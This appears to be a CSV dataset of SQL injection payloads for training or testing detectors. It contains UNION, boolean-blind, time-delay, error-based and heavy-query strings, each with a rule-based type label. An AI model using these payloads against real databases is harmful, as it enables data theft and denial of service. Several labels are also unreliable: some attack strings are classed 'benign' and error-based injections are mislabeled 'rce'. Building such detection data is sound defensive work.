row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1140,"1"" ) ) as bbkl where 5686 = 5686",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1141,"1%"" ) and ( 3020 = 3020 ) *6703 and ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1142,1'+ ( select 'cwta' where 6091 = 6091,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1143,"1%"" ) ) and elt ( 4249 = 4249,7259 ) and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1144,"-6333"" ) ) ) union all select 9851,9851,9851,9851,9851,9851--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1145,"1"" ) ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""xccy"" = ""xccy",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1146,"1"" ) as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1147,"-2298%' or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1148,"-1808%"" ) ) or 4595 = 3545 and ( ( ""%"" = """,1,,boolean_blind,generic,0.95,4595 = 3545 and detected — boolean_blind injection (priority 8) on generic,rule-based
1149,1 ) as bhdj where 4472 = 4472,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1150,"1%"" union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1151,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
1152,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1153,1' ) ) as pgif where 6346 = 6346,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1154,"1"" ) as yekp where 3049 = 3049 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,,boolean_blind,generic,0.95,3049 = 3049 and detected — boolean_blind injection (priority 8) on generic,rule-based
1155,"1"" ) ) as mvxa where 3024 = 3024",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1156,"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""cneo"" like ""cneo",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1157,"1%"" ) rlike sleep ( 5 ) and ( ""%"" = """,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1158,"1' ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1159,"1' ) as knxr where 5662 = 5662 union all select null,null,null,null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1160,-6045 or 8919 = 2827--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1161,"1%"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
